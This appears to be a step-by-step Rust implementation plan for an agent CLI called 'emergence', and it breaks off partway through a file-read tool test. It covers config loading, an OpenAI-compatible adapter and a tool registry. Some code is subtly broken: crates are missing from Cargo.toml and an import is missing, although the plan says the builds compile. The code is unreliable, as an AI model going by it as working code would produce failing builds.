# emergence Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a Claude Code-like agent CLI tool with multi-provider LLM support, 8 tools, tiered permissions, session persistence, and ratatui TUI.

**Architecture:** Single tokio binary with trait-isolated modules. TUI communicates with the agent loop via mpsc channels (Action in, Event out). LLM providers implement a common Provider trait; tools implement a common Tool trait; both are managed by registries.

**Tech Stack:** Rust, Tokio, ratatui, crossterm, reqwest, serde/serde_json, async-trait, clap

---

### Task 1: Project scaffolding

**Files:**
- Create: `Cargo.toml`
- Create: `src/main.rs`
- Create: `src/app.rs`
- Create: `.gitignore`

- [ ] **Step 1: Initialize Cargo.toml**

```toml
[package]
name = "emergence"
version = "0.1.0"
edition = "2021"

[dependencies]
tokio = { version = "1", features = ["full"] }
ratatui = "0.28"
crossterm = "0.28"
reqwest = { version = "0.12", features = ["stream", "json"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
async-trait = "0.1"
tokio-stream = "0.1"
clap = { version = "4", features = ["derive"] }
tracing = "0.1"
tracing-subscriber = { version = "0.3", features = ["env-filter"] }
chrono = { version = "0.4", features = ["serde"] }

[dev-dependencies]
mockall = "0.12"
tempfile = "3"
tokio-test = "0.4"
```

- [ ] **Step 2: Initialize .gitignore**

```
/target
/.emergence
```

- [ ] **Step 3: Write minimal main.rs**

```rust
use tracing_subscriber::EnvFilter;

mod app;

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    tracing::info!("emergence v{} starting", env!("CARGO_PKG_VERSION"));
}
```

- [ ] **Step 4: Write empty app.rs placeholder**

```rust
// App state machine and agent loop — implemented in Task 14
```

- [ ] **Step 5: Build and verify**

Run: `cargo build`
Expected: Compiles successfully, no warnings.

- [ ] **Step 6: Commit**

```bash
git add Cargo.toml src/main.rs src/app.rs .gitignore
git commit -m "feat: project scaffolding with tokio + ratatui dependencies"
```

---

### Task 2: Core types — messages, events, streaming

**Files:**
- Create: `src/llm/mod.rs`
- Create: `src/llm/message.rs`

- [ ] **Step 1: Write message.rs with unified ChatMessage, ToolDefinition, and related types**

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum Role {
    #[serde(rename = "system")]
    System,
    #[serde(rename = "user")]
    User,
    #[serde(rename = "assistant")]
    Assistant,
    #[serde(rename = "tool")]
    Tool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChatMessage {
    pub role: Role,
    pub content: Content,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub name: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Content {
    Text(String),
    Parts(Vec<ContentPart>),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum ContentPart {
    #[serde(rename = "text")]
    Text { text: String },
    #[serde(rename = "tool_use")]
    ToolUse {
        id: String,
        name: String,
        input: serde_json::Value,
    },
    #[serde(rename = "tool_result")]
    ToolResult {
        tool_use_id: String,
        content: String,
        #[serde(skip_serializing_if = "Option::is_none")]
        is_error: Option<bool>,
    },
}

impl ChatMessage {
    pub fn system(text: impl Into<String>) -> Self {
        Self {
            role: Role::System,
            content: Content::Text(text.into()),
            name: None,
        }
    }

    pub fn user(text: impl Into<String>) -> Self {
        Self {
            role: Role::User,
            content: Content::Text(text.into()),
            name: None,
        }
    }

    pub fn assistant(text: impl Into<String>) -> Self {
        Self {
            role: Role::Assistant,
            content: Content::Text(text.into()),
            name: None,
        }
    }

    pub fn tool_call(id: String, name: String, input: serde_json::Value) -> Self {
        Self {
            role: Role::Assistant,
            content: Content::Parts(vec![ContentPart::ToolUse { id, name, input }]),
            name: None,
        }
    }

    pub fn tool_result(tool_use_id: String, content: String, is_error: Option<bool>) -> Self {
        Self {
            role: Role::Tool,
            content: Content::Parts(vec![ContentPart::ToolResult {
                tool_use_id,
                content,
                is_error,
            }]),
            name: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolDefinition {
    pub name: String,
    pub description: String,
    pub parameters: serde_json::Value,
}

impl ToolDefinition {
    pub fn new(
        name: impl Into<String>,
        description: impl Into<String>,
        parameters: serde_json::Value,
    ) -> Self {
        Self {
            name: name.into(),
            description: description.into(),
            parameters,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum StopReason {
    #[serde(rename = "end_turn")]
    EndTurn,
    #[serde(rename = "max_tokens")]
    MaxTokens,
    #[serde(rename = "tool_use")]
    ToolUse,
    #[serde(rename = "stop_sequence")]
    StopSequence,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Usage {
    pub input_tokens: u32,
    pub output_tokens: u32,
}

#[derive(Debug, Clone)]
pub enum StreamEvent {
    TextDelta(String),
    ThinkingDelta(String),
    ToolCallDelta {
        id: String,
        name: String,
        arguments_json_fragment: String,
    },
    Finish {
        stop_reason: StopReason,
        usage: Usage,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModelInfo {
    pub id: String,
    pub name: String,
    pub max_tokens: u32,
}

#[derive(Debug, Clone)]
pub struct GenerationConfig {
    pub max_tokens: u32,
    pub temperature: f64,
    pub top_p: f64,
    pub stop_sequences: Vec<String>,
    pub thinking: Option<u32>,
    pub tools: Option<Vec<ToolDefinition>>,
}

impl Default for GenerationConfig {
    fn default() -> Self {
        Self {
            max_tokens: 32000,
            temperature: 0.7,
            top_p: 1.0,
            stop_sequences: vec![],
            thinking: None,
            tools: None,
        }
    }
}
```

- [ ] **Step 2: Write llm/mod.rs**

```rust
pub mod message;

use std::pin::Pin;
use async_trait::async_trait;
use futures::Stream;
use crate::llm::message::{
    ChatMessage, GenerationConfig, ModelInfo, StreamEvent, ToolDefinition,
};

pub type ChatStream = Pin<Box<dyn Stream<Item = Result<StreamEvent, anyhow::Error>> + Send>>;

#[async_trait]
pub trait Provider: Send + Sync {
    async fn chat(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> anyhow::Result<ChatStream>;

    fn models(&self) -> &[ModelInfo];
}
```

- [ ] **Step 3: Build and verify**

Run: `cargo build`
Expected: Compiles with warnings about unused imports (acceptable at this stage).

- [ ] **Step 4: Commit**

```bash
git add src/llm/
git commit -m "feat: add core types — ChatMessage, StreamEvent, Provider trait"
```

---

### Task 3: Config system — Settings struct and parsing

**Files:**
- Create: `src/config/mod.rs`
- Create: `src/config/settings.rs`
- Create: `src/utils/mod.rs`
- Create: `src/utils/env.rs`

- [ ] **Step 1: Write env.rs for `${ENV_VAR}` expansion**

```rust
pub fn expand_env_vars(value: &str) -> String {
    let mut result = value.to_string();
    let mut start = None;

    loop {
        if let Some(pos) = result.find("${") {
            start = Some(pos);
            if let Some(end) = result[pos..].find('}') {
                let var_name = &result[pos + 2..pos + end];
                let env_value = std::env::var(var_name).unwrap_or_default();
                result.replace_range(pos..=pos + end, &env_value);
            } else {
                break;
            }
        } else {
            break;
        }
    }

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_expand_env_vars() {
        std::env::set_var("TEST_VAR", "hello");
        assert_eq!(expand_env_vars("${TEST_VAR} world"), "hello world");
    }

    #[test]
    fn test_expand_missing_var() {
        assert_eq!(expand_env_vars("${MISSING} world"), " world");
    }
}
```

- [ ] **Step 2: Write settings.rs with Settings struct**

```rust
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Settings {
    pub version: u32,
    #[serde(default = "default_model")]
    pub model: String,
    #[serde(default)]
    pub generation: GenerationSettings,
    pub providers: HashMap<String, ProviderConfig>,
    #[serde(default)]
    pub permissions: PermissionsConfig,
    #[serde(default)]
    pub tools: ToolsConfig,
    #[serde(default)]
    pub session: SessionConfig,
}

fn default_model() -> String {
    "deepseek/deepseek-v4-pro".into()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GenerationSettings {
    #[serde(default = "default_max_tokens")]
    pub max_tokens: u32,
    #[serde(default = "default_temperature")]
    pub temperature: f64,
    #[serde(default = "default_top_p")]
    pub top_p: f64,
    #[serde(default)]
    pub stop_sequences: Vec<String>,
    pub thinking: Option<u32>,
}

fn default_max_tokens() -> u32 { 32000 }
fn default_temperature() -> f64 { 0.7 }
fn default_top_p() -> f64 { 1.0 }

impl Default for GenerationSettings {
    fn default() -> Self {
        Self {
            max_tokens: default_max_tokens(),
            temperature: default_temperature(),
            top_p: default_top_p(),
            stop_sequences: vec![],
            thinking: None,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProviderConfig {
    pub api_key: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub base_url: Option<String>,
    #[serde(default = "default_model")]
    pub default_model: String,
    #[serde(default)]
    pub extra_headers: HashMap<String, String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PermissionsConfig {
    #[serde(default)]
    pub auto_approve: Vec<String>,
    #[serde(default)]
    pub deny_patterns: Vec<String>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ToolsConfig {
    #[serde(default)]
    pub disabled: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionConfig {
    #[serde(default = "default_store_dir")]
    pub store_dir: String,
    #[serde(default = "default_true")]
    pub auto_save: bool,
    #[serde(default = "default_compaction_threshold")]
    pub compaction_threshold_tokens: u32,
}

fn default_store_dir() -> String { "~/.emergence/sessions".into() }
fn default_true() -> bool { true }
fn default_compaction_threshold() -> u32 { 80000 }

impl Default for SessionConfig {
    fn default() -> Self {
        Self {
            store_dir: default_store_dir(),
            auto_save: default_true(),
            compaction_threshold_tokens: default_compaction_threshold(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_minimal_settings() {
        let json = r#"{
            "version": 1,
            "providers": {
                "deepseek": {
                    "api_key": "test-key"
                }
            }
        }"#;
        let settings: Settings = serde_json::from_str(json).unwrap();
        assert_eq!(settings.version, 1);
        assert_eq!(settings.providers["deepseek"].api_key, "test-key");
    }

    #[test]
    fn test_defaults() {
        let json = r#"{"version": 1, "providers": {}}"#;
        let settings: Settings = serde_json::from_str(json).unwrap();
        assert_eq!(settings.session.store_dir, "~/.emergence/sessions");
        assert!(settings.session.auto_save);
    }
}
```

- [ ] **Step 3: Write config/mod.rs with ConfigManager**

```rust
pub mod settings;

use std::path::{Path, PathBuf};
use anyhow::Context;
use crate::config::settings::Settings;
use crate::utils::env::expand_env_vars;

pub struct ConfigManager {
    pub settings: Settings,
    pub project_instructions: Option<String>,
    pub cwd: PathBuf,
}

impl ConfigManager {
    pub fn load(cwd: PathBuf, cli_model: Option<String>) -> anyhow::Result<Self> {
        let mut settings = Self::load_merged_settings(&cwd)?;

        if let Some(m) = cli_model {
            settings.model = m;
        }

        Self::expand_provider_env_vars(&mut settings);

        let project_instructions = Self::load_agents_md(&cwd);

        Ok(Self {
            settings,
            project_instructions,
            cwd,
        })
    }

    fn load_merged_settings(cwd: &Path) -> anyhow::Result<Settings> {
        // Priority: ./.emergence/settings.json > ~/.emergence/settings.json
        let mut merged = Settings::default_with_empty_providers();

        // User-level
        if let Ok(user_settings) = Self::read_settings_json(&Self::user_config_dir()) {
            merged = merged.merge(user_settings);
        }

        // Project-level (higher priority)
        if let Ok(project_settings) = Self::read_settings_json(&cwd.join(".emergence").join("settings.json")) {
            merged = merged.merge(project_settings);
        }

        // Validate
        if merged.providers.is_empty() {
            anyhow::bail!("No providers configured. Add at least one provider in settings.json");
        }

        Ok(merged)
    }

    fn read_settings_json(path: &Path) -> anyhow::Result<Settings> {
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("Failed to read {}", path.display()))?;
        serde_json::from_str(&content)
            .with_context(|| format!("Invalid JSON in {}", path.display()))
    }

    fn expand_provider_env_vars(settings: &mut Settings) {
        for provider in settings.providers.values_mut() {
            provider.api_key = expand_env_vars(&provider.api_key);
        }
    }

    fn load_agents_md(cwd: &Path) -> Option<String> {
        let paths = [
            cwd.join(".emergence").join("AGENTS.md"),
            Self::user_config_dir().join("AGENTS.md"),
        ];

        for path in &paths {
            if let Ok(content) = std::fs::read_to_string(path) {
                return Some(content);
            }
        }

        None
    }

    fn user_config_dir() -> PathBuf {
        dirs_next().unwrap_or_else(|| PathBuf::from("~/.emergence"))
    }

    pub fn reload(&mut self) -> anyhow::Result<()> {
        let new = Self::load(self.cwd.clone(), None)?;
        self.settings = new.settings;
        self.project_instructions = new.project_instructions;
        Ok(())
    }

    pub fn effective_provider(&self, name: &str) -> Option<&settings::ProviderConfig> {
        self.settings.providers.get(name)
    }

    pub fn effective_model(&self) -> &str {
        &self.settings.model
    }
}

fn dirs_next() -> Option<PathBuf> {
    std::env::var("HOME").ok().map(|h| PathBuf::from(h).join(".emergence"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    #[test]
    fn test_load_project_settings() {
        let dir = TempDir::new().unwrap();
        let emergence_dir = dir.path().join(".emergence");
        std::fs::create_dir_all(&emergence_dir).unwrap();
        std::fs::write(
            emergence_dir.join("settings.json"),
            r#"{"version": 1, "providers": {"deepseek": {"api_key": "sk-test"}}, "model": "deepseek/test"}"#,
        )
        .unwrap();

        let config = ConfigManager::load(dir.path().to_path_buf(), None).unwrap();
        assert_eq!(config.settings.model, "deepseek/test");
        assert_eq!(config.settings.providers["deepseek"].api_key, "sk-test");
    }
}

// Extend Settings with merge and default_with_empty_providers
impl Settings {
    fn default_with_empty_providers() -> Self {
        Self {
            version: 1,
            model: default_model(),
            generation: GenerationSettings::default(),
            providers: std::collections::HashMap::new(),
            permissions: PermissionsConfig::default(),
            tools: ToolsConfig::default(),
            session: SessionConfig::default(),
        }
    }

    fn merge(mut self, other: Settings) -> Self {
        if other.model != default_model() {
            self.model = other.model;
        }
        self.generation = other.generation;
        self.providers.extend(other.providers);
        self.permissions.auto_approve.extend(other.permissions.auto_approve);
        self.permissions.deny_patterns.extend(other.permissions.deny_patterns);
        self.tools.disabled.extend(other.tools.disabled);
        self.session = other.session;
        self
    }
}
```

- [ ] **Step 4: Write utils/mod.rs**

```rust
pub mod env;
```

- [ ] **Step 5: Build and run tests**

Run: `cargo test`
Expected: All tests pass (2 in env.rs, 2 in settings.rs, 1 in config/mod.rs).

- [ ] **Step 6: Commit**

```bash
git add src/config/ src/utils/
git commit -m "feat: add config system with settings parsing and env var expansion"
```

---

### Task 4: Config — CLI argument parsing and AGENTS.md

**Files:**
- Modify: `src/main.rs`
- Create: `src/config/agents_md.rs`

- [ ] **Step 1: Write agents_md.rs to parse AGENTS.md**

```rust
use std::path::Path;

/// Reads the AGENTS.md file at the given path. Returns None if not found.
pub fn read_agents_md(path: &Path) -> Option<String> {
    let content = std::fs::read_to_string(path).ok()?;
    let trimmed = content.trim();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed.to_string())
    }
}

/// Formats AGENTS.md content for injection into the system prompt.
pub fn format_instructions(content: &str) -> String {
    format!(
        "<project_instructions>\n{}\n</project_instructions>",
        content
    )
}
```

- [ ] **Step 2: Update config/mod.rs to use agents_md module**

Replace the `load_agents_md` method in config/mod.rs to use the new module:

```rust
pub mod agents_md;

// In ConfigManager impl, replace the load_agents_md method:

fn load_agents_md(cwd: &Path) -> Option<String> {
    let paths = [
        cwd.join(".emergence").join("AGENTS.md"),
        Self::user_config_dir().join("AGENTS.md"),
    ];

    for path in &paths {
        if let Some(content) = agents_md::read_agents_md(&path) {
            return Some(agents_md::format_instructions(&content));
        }
    }

    None
}
```

- [ ] **Step 3: Update main.rs with clap CLI**

```rust
use clap::Parser;
use tracing_subscriber::EnvFilter;

mod app;
mod config;
mod utils;

#[derive(Parser)]
#[command(name = "emergence", about = "Agent CLI tool")]
struct Cli {
    /// Model to use (e.g., "deepseek/deepseek-v4-pro")
    #[arg(short, long)]
    model: Option<String>,

    /// Working directory
    #[arg(short, long, default_value = ".")]
    dir: String,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .init();

    let cli = Cli::parse();
    let cwd = std::path::PathBuf::from(&cli.dir).canonicalize()?;

    let config = config::ConfigManager::load(cwd, cli.model)?;
    tracing::info!("Loaded config, model: {}", config.effective_model());

    Ok(())
}
```

- [ ] **Step 4: Build and test**

Run: `cargo test && cargo build`
Expected: All tests pass, binary compiles. Test `--help`:

Run: `cargo run -- --help`
Expected: Prints usage with --model and --dir flags.

- [ ] **Step 5: Commit**

```bash
git add src/config/agents_md.rs src/main.rs src/config/mod.rs
git commit -m "feat: add CLI arg parsing and AGENTS.md support"
```

---

### Task 5: LLM — OpenAI-compatible adapter

**Files:**
- Create: `src/llm/openai.rs`
- Create: `src/llm/registry.rs`

- [ ] **Step 5.0: Write a unit test for the adapter message conversion first**

Create `src/llm/openai.rs` with tests:

```rust
use std::pin::Pin;
use async_trait::async_trait;
use futures::{Stream, StreamExt};
use reqwest::Client;
use serde_json::Value;
use crate::config::settings::ProviderConfig;
use crate::llm::message::{
    ChatMessage, GenerationConfig, ModelInfo, Role, StreamEvent, ToolDefinition,
};
use crate::llm::{ChatStream, Provider};

pub struct OpenAIAdapter {
    client: Client,
    config: ProviderConfig,
    models: Vec<ModelInfo>,
}

impl OpenAIAdapter {
    pub fn new(config: ProviderConfig, models: Vec<ModelInfo>) -> Self {
        Self {
            client: Client::new(),
            config,
            models,
        }
    }

    fn build_request_body(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> Value {
        let msgs: Vec<Value> = messages.iter().map(|m| self.convert_message(m)).collect();

        let mut body = serde_json::json!({
            "model": model,
            "messages": msgs,
            "max_tokens": config.max_tokens,
            "temperature": config.temperature,
            "top_p": config.top_p,
            "stream": true,
        });

        if !tools.is_empty() {
            body["tools"] = serde_json::json!(tools);
        }

        body
    }

    fn convert_message(&self, msg: &ChatMessage) -> Value {
        // Convert from our internal format to OpenAI API format
        let role_str = match msg.role {
            Role::System => "system",
            Role::User => "user",
            Role::Assistant => "assistant",
            Role::Tool => "tool",
        };

        match &msg.content {
            crate::llm::message::Content::Text(text) => {
                serde_json::json!({
                    "role": role_str,
                    "content": text,
                })
            }
            crate::llm::message::Content::Parts(parts) => {
                let openai_parts: Vec<Value> = parts
                    .iter()
                    .filter_map(|p| match p {
                        crate::llm::message::ContentPart::Text { text } => {
                            Some(serde_json::json!({"type": "text", "text": text}))
                        }
                        crate::llm::message::ContentPart::ToolUse { id, name, input } => {
                            Some(serde_json::json!({
                                "type": "function",
                                "id": id,
                                "function": {"name": name, "arguments": serde_json::to_string(input).unwrap_or_default()}
                            }))
                        }
                        crate::llm::message::ContentPart::ToolResult { tool_use_id, content, is_error } => {
                            Some(serde_json::json!({
                                "role": "tool",
                                "tool_call_id": tool_use_id,
                                "content": content,
                            }))
                        }
                    })
                    .collect();
                serde_json::json!({
                    "role": role_str,
                    "content": openai_parts,
                })
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_convert_simple_message() {
        let config = ProviderConfig {
            api_key: "test".into(),
            base_url: None,
            default_model: "test-model".into(),
            extra_headers: Default::default(),
        };
        let adapter = OpenAIAdapter::new(config, vec![]);

        let msg = ChatMessage::user("hello");
        let body = adapter.build_request_body(
            "test-model",
            &[msg],
            &[],
            &GenerationConfig::default(),
        );

        assert_eq!(body["messages"][0]["role"], "user");
        assert_eq!(body["messages"][0]["content"], "hello");
        assert_eq!(body["stream"], true);
    }

    #[test]
    fn test_convert_tool_message() {
        let config = ProviderConfig {
            api_key: "test".into(),
            base_url: None,
            default_model: "test-model".into(),
            extra_headers: Default::default(),
        };
        let adapter = OpenAIAdapter::new(config, vec![]);

        let tool_msg = ChatMessage::tool_result(
            "call_1".into(),
            "result content".into(),
            None,
        );

        let body = adapter.build_request_body(
            "test-model",
            &[tool_msg],
            &[],
            &GenerationConfig::default(),
        );

        // Tool messages in OpenAI API format should have role "tool"
        let msg = &body["messages"][0];
        assert_eq!(msg["role"], "tool");
    }
}
```

- [ ] **Step 5.1: Write the impl Provider block for OpenAIAdapter**

Add to `src/llm/openai.rs`:

```rust
#[async_trait]
impl Provider for OpenAIAdapter {
    async fn chat(
        &self,
        model: &str,
        messages: &[ChatMessage],
        tools: &[ToolDefinition],
        config: &GenerationConfig,
    ) -> anyhow::Result<ChatStream> {
        let body = self.build_request_body(model, messages, tools, config);
        let url = format!(
            "{}/chat/completions",
            self.config.base_url.as_deref().unwrap_or("https://api.openai.com/v1")
        );

        let response = self
            .client
            .post(&url)
            .header("Authorization", format!("Bearer {}", self.config.api_key))
            .json(&body)
            .send()
            .await?;

        if !response.status().is_success() {
            let status = response.status();
            let error_body = response.text().await.unwrap_or_default();
            anyhow::bail!("LLM API error ({}): {}", status, error_body);
        }

        let stream = response
            .bytes_stream()
            .map(|chunk| -> Result<StreamEvent, anyhow::Error> {
                let bytes = chunk?;
                let line = String::from_utf8_lossy(&bytes);

                // Parse SSE: "data: {...}\n\n"
                for data_line in line.lines().filter(|l| l.starts_with("data: ")) {
                    let json_str = &data_line[6..];
                    if json_str == "[DONE]" {
                        return Ok(StreamEvent::Finish {
                            stop_reason: crate::llm::message::StopReason::EndTurn,
                            usage: Default::default(),
                        });
                    }
                    let parsed: Value = serde_json::from_str(json_str)?;
                    if let Some(choice) = parsed["choices"][0].as_object() {
                        if let Some(delta) = choice.get("delta") {
                            if let Some(content) = delta.get("content").and_then(|c| c.as_str()) {
                                return Ok(StreamEvent::TextDelta(content.to_string()));
                            }
                        }
                        if let Some(finish_reason) = choice.get("finish_reason").and_then(|f| f.as_str()) {
                            let stop_reason = match finish_reason {
                                "tool_calls" => crate::llm::message::StopReason::ToolUse,
                                "stop" => crate::llm::message::StopReason::EndTurn,
                                "length" => crate::llm::message::StopReason::MaxTokens,
                                _ => crate::llm::message::StopReason::EndTurn,
                            };
                            return Ok(StreamEvent::Finish {
                                stop_reason,
                                usage: Default::default(),
                            });
                        }
                    }
                }
                // If no event found in this chunk, return a placeholder — callers filter
                Err(anyhow::anyhow!("no event in chunk"))
            });

        Ok(Box::pin(stream))
    }

    fn models(&self) -> &[ModelInfo] {
        &self.models
    }
}
```

- [ ] **Step 5.2: Write registry.rs**

```rust
use crate::llm::message::ToolDefinition;
use crate::llm::Provider;
use std::collections::HashMap;

pub struct ProviderRegistry {
    providers: HashMap<String, Box<dyn Provider>>,
}

impl ProviderRegistry {
    pub fn new() -> Self {
        Self {
            providers: HashMap::new(),
        }
    }

    pub fn register(&mut self, name: impl Into<String>, provider: Box<dyn Provider>) {
        self.providers.insert(name.into(), provider);
    }

    pub fn get(&self, name: &str) -> Option<&dyn Provider> {
        self.providers.get(name).map(|p| p.as_ref())
    }
}

// We don't need definitions() on ProviderRegistry — that's the ToolRegistry's job
// The spec shows it but it's an error — ToolDefinition belongs to tools, not providers
```

- [ ] **Step 5.3: Build and run tests**

Run: `cargo test`
Expected: All tests pass (existing + 2 new OpenAI adapter tests).

- [ ] **Step 5.4: Commit**

```bash
git add src/llm/openai.rs src/llm/registry.rs
git commit -m "feat: add OpenAI-compatible provider adapter and registry"
```

---

### Task 6: Tools — Trait and Registry

**Files:**
- Create: `src/tools/mod.rs`

- [ ] **Step 1: Write tools/mod.rs with Tool trait, ToolRegistry, and RiskLevel**

```rust
use std::collections::HashMap;
use async_trait::async_trait;
use serde_json::Value;

#[derive(Debug, Clone, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub enum RiskLevel {
    ReadOnly,
    Write,
    System,
}

#[derive(Debug, Clone)]
pub struct ToolOutput {
    pub content: String,
    pub metadata: Option<Value>,
}

#[async_trait]
pub trait Tool: Send + Sync {
    fn name(&self) -> &str;
    fn description(&self) -> &str;
    fn parameters(&self) -> Value;
    fn risk_level(&self, params: &Value) -> RiskLevel;
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput>;
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolDefinition {
    pub name: String,
    pub description: String,
    pub parameters: Value,
}

impl ToolDefinition {
    pub fn from_tool(tool: &dyn Tool) -> Self {
        Self {
            name: tool.name().to_string(),
            description: tool.description().to_string(),
            parameters: tool.parameters(),
        }
    }
}

pub struct ToolRegistry {
    tools: HashMap<String, Box<dyn Tool>>,
}

impl ToolRegistry {
    pub fn new() -> Self {
        Self {
            tools: HashMap::new(),
        }
    }

    pub fn register<T: Tool + 'static>(&mut self, tool: T) {
        let name = tool.name().to_string();
        self.tools.insert(name, Box::new(tool));
    }

    pub fn get(&self, name: &str) -> Option<&dyn Tool> {
        self.tools.get(name).map(|t| t.as_ref())
    }

    pub fn definitions(&self) -> Vec<ToolDefinition> {
        self.tools.values().map(|t| ToolDefinition::from_tool(t.as_ref())).collect()
    }

    pub async fn execute(
        &self,
        name: &str,
        params: Value,
    ) -> anyhow::Result<ToolOutput> {
        let tool = self
            .tools
            .get(name)
            .ok_or_else(|| anyhow::anyhow!("Unknown tool: {}", name))?;
        tool.execute(params).await
    }

    pub fn risk_level(&self, name: &str, params: &Value) -> anyhow::Result<RiskLevel> {
        let tool = self
            .tools
            .get(name)
            .ok_or_else(|| anyhow::anyhow!("Unknown tool: {}", name))?;
        Ok(tool.risk_level(params))
    }
}

use serde::Serialize;
```

- [ ] **Step 2: Build and verify**

Run: `cargo build`
Expected: Compiles (may have unused import warnings).

- [ ] **Step 3: Write unit test in mod.rs**

Add at the end of `src/tools/mod.rs`:

```rust
#[cfg(test)]
mod tests {
    use super::*;

    struct MockTool;

    #[async_trait]
    impl Tool for MockTool {
        fn name(&self) -> &str { "mock" }
        fn description(&self) -> &str { "A mock tool" }
        fn parameters(&self) -> Value {
            serde_json::json!({"type": "object", "properties": {}})
        }
        fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::ReadOnly }
        async fn execute(&self, _params: Value) -> anyhow::Result<ToolOutput> {
            Ok(ToolOutput {
                content: "mock result".into(),
                metadata: None,
            })
        }
    }

    #[tokio::test]
    async fn test_registry_register_and_get() {
        let mut registry = ToolRegistry::new();
        registry.register(MockTool);

        assert!(registry.get("mock").is_some());
        assert!(registry.get("nonexistent").is_none());
    }

    #[tokio::test]
    async fn test_registry_definitions() {
        let mut registry = ToolRegistry::new();
        registry.register(MockTool);

        let defs = registry.definitions();
        assert_eq!(defs.len(), 1);
        assert_eq!(defs[0].name, "mock");
    }

    #[tokio::test]
    async fn test_registry_execute() {
        let mut registry = ToolRegistry::new();
        registry.register(MockTool);

        let result = registry.execute("mock", serde_json::json!({})).await.unwrap();
        assert_eq!(result.content, "mock result");
    }

    #[tokio::test]
    async fn test_risk_level() {
        let mut registry = ToolRegistry::new();
        registry.register(MockTool);

        let level = registry.risk_level("mock", &serde_json::json!({})).unwrap();
        assert_eq!(level, RiskLevel::ReadOnly);
    }
}
```

- [ ] **Step 4: Run tests**

Run: `cargo test`
Expected: All 4 new tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/tools/mod.rs
git commit -m "feat: add Tool trait, ToolRegistry, and RiskLevel"
```

---

### Task 7: Tools — Read, Write, Edit

**Files:**
- Create: `src/tools/file.rs`

- [ ] **Step 1: Write file.rs with ReadTool**

```rust
use std::path::PathBuf;
use async_trait::async_trait;
use serde_json::Value;
use crate::tools::{RiskLevel, Tool, ToolOutput};

pub struct ReadTool {
    cwd: PathBuf,
}

impl ReadTool {
    pub fn new(cwd: PathBuf) -> Self { Self { cwd } }

    fn resolve_path(&self, file_path: &str) -> PathBuf {
        let p = PathBuf::from(file_path);
        if p.is_absolute() { p } else { self.cwd.join(p) }
    }
}

#[async_trait]
impl Tool for ReadTool {
    fn name(&self) -> &str { "read" }
    fn description(&self) -> &str {
        "Read a file from the filesystem. Supports offset and limit for partial reads."
    }
    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "file_path": {"type": "string", "description": "Absolute path to the file"},
                "offset": {"type": "integer", "description": "Line number to start reading from"},
                "limit": {"type": "integer", "description": "Number of lines to read"}
            },
            "required": ["file_path"]
        })
    }
    fn risk_level(&self, _params: &Value) -> RiskLevel { RiskLevel::ReadOnly }
    async fn execute(&self, params: Value) -> anyhow::Result<ToolOutput> {
        let file_path = params["file_path"].as_str().unwrap_or("");
        let path = self.resolve_path(file_path);

        let content = std::fs::read_to_string(&path)?;
        let lines: Vec<&str> = content.lines().collect();

        let offset = params.get("offset").and_then(|v| v.as_u64()).unwrap_or(0) as usize;
        let limit = params.get("limit").and_then(|v| v.as_u64()).map(|l| l as usize);

        let start = offset.min(lines.len());
        let end = limit.map(|l| (start + l).min(lines.len())).unwrap_or(lines.len());
        let selected: Vec<String> = lines[start..end]
            .iter()
            .enumerate()
            .map(|(i, line)| format!("{:>6}\t{}", start + i + 1, line))
            .collect();

        Ok(ToolOutput {
            content: selected.join("\n"),
            metadata: Some(serde_json::json!({
                "total_lines": lines.len(),
                "start": start + 1,
                "end": end,
            })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;
    use std::io::Write;

    #[tokio::test]
    async fn test_read_file() {
        let dir = TempDir::new().unwrap();
        let file_path = dir.path().join("test.txt");
        std::fs::write(&file_path, "line1\nline2\nline3\n").unwrap();

        let tool = ReadTool::new(dir.path().to_path_buf());
        let result = tool.execute(serde_json::json!({
            "file_path": file_path.to_str().unwrap()
        })).await.unwrap();

        assert!(result.content.contains("line1"));
